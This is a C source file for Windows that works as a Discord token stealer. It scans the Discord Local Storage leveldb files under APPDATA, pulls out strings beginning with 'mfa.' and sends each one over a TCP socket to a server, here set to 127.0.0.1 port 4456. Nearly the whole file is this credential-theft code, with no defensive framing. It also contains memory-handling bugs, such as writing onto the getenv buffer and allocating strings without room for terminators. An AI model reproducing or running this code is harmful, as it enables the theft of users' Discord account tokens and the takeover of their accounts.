
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>



#pragma comment(lib,"ws2_32.lib") //Winsock Library

struct Files{ //struct of file to save files path and number of files
    char **files;
    int numberOfFiles;
};


struct Files ListDirectoryContents(const char *sDir) //return all the file paths of directory
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];
	struct Files files;
    files.files=NULL;
    files.numberOfFiles=0;
	int countOfFiles=0;
    char **filePointers=malloc(0);
    //Specify a file mask. *.* = We want everything!
    sprintf(sPath, "%s\\*.*", sDir);

    if((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        printf("Path not found: [%s]\n", sDir);
        return files;
    }

    do
    {
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile.cFileName, ".") != 0
                && strcmp(fdFile.cFileName, "..") != 0)
        {
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
            sprintf(sPath, "%s%s", sDir, fdFile.cFileName);

            //Is the entity a File or Folder?
            if(fdFile.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
            {
                printf("Directory: %s\n", sPath);
                ListDirectoryContents(sPath); //Recursion, I love it!
            }
            else{
                
                
                int len=strlen(sPath);
                
                char *ptr=malloc(len);
                strcpy(ptr,sPath);
                //printf("%s\n",ptr);
                countOfFiles++;
                filePointers=realloc(filePointers,countOfFiles*sizeof(ptr));
                
                filePointers[countOfFiles-1]=ptr;
                
                //printf("%s\n",(filePointers[countOfFiles-1]));
            }
        }
		
    }
    while(FindNextFile(hFind, &fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!
    files.files=filePointers;
    files.numberOfFiles=countOfFiles;
    return files;
}


int SendTokensToServer(char *token)
{
    WSADATA wsa;
	SOCKET s;
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		return -1;
	}
	
	printf("Initialised.\n");
	
	
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}

	printf("Socket created.\n");

	struct sockaddr_in server;

	/*
		 IPv4 AF_INET sockets:
	struct sockaddr_in {
		short            sin_family;   // e.g. AF_INET, AF_INET6
		unsigned short   sin_port;     // e.g. htons(3490)
		struct in_addr   sin_addr;     // see struct in_addr, below
		char             sin_zero[8];  // zero this if you want to
	};


	typedef struct in_addr {
	union {
		struct {
		u_char s_b1,s_b2,s_b3,s_b4;
		} S_un_b;
		struct {
		u_short s_w1,s_w2;
		} S_un_w;
		u_long S_addr;
	} S_un;
	} IN_ADDR, *PIN_ADDR, FAR *LPIN_ADDR;


	struct sockaddr {
		unsigned short    sa_family;    // address family, AF_xxx
		char              sa_data[14];  // 14 bytes of protocol address
	};
	*/


	server.sin_addr.s_addr=inet_addr("127.0.0.1");
	server.sin_family=AF_INET;
	server.sin_port=htons(4456);
	if(connect(s,(struct sockaddr *)&server,sizeof(server))<0)
	{
		puts("connect error");
		return -1;
	}

	puts("Connected!!!");


	char *message;

	message=token;

	if(send(s,message,strlen(message),0)<0)
	{
		puts("Send falied");
		return -1;
	}

	puts("DataSend\n");



	//Receive a reply from the server
	return 0;
}

int main()
{
	printf("hello\n");
	
	char *appdataPath=getenv("APPDATA");
    strcat(appdataPath,"\\discord\\Local Storage\\leveldb\\");
	struct Files files=ListDirectoryContents(appdataPath);
	//fp=fopen("hello.txt","r");
    //printf("%d\n",sizeof(files));
    for(int i=0; i<files.numberOfFiles;i++)
    {
        printf("%s\n",files.files[i]);
        char *path=files.files[i];
        FILE *fp;
        fp=fopen(path,"rb");
        if(fp==NULL)
        {
            printf("failed file not exist\n");
            return -1;
        }
        char find[]="mfa.";
        //fseek(fp, 0, SEEK_END);
        fseek (fp , 0 , SEEK_END);//size of file
        int sizeOfFile = ftell (fp);
        rewind (fp);
        //move back the pointer
        //fseek(fp, 0, SEEK_SET);
        char *content=(char*) malloc (sizeof(char)*sizeOfFile);
        //fread(content,sizeof(content),sizeOfFile,fp);
        char *word;
        char ch;
        char *startContent=content;
        for  (int z=0;z<sizeOfFile;z++)
        {
            ch=fgetc(fp);
            if (ch>0&&ch<=127)
            {
                *content=ch;
                content++;
            }
        }
        //printf("%s\n",startContent);
        if((word =strstr(startContent,find))==NULL)
        {
            printf("failed mfa not exist\n");
            continue;
        }

        sizeOfFile=strlen(word);
        char token[sizeOfFile];
        int j=0;
        for (; j<sizeOfFile&&word[j]!=34;j++) //34=" in ascii
        {
            token[j]=word[j];
        }
        token[j]=0;
        printf("%s\n",token);

        SendTokensToServer(token);
    }

	return (0);
}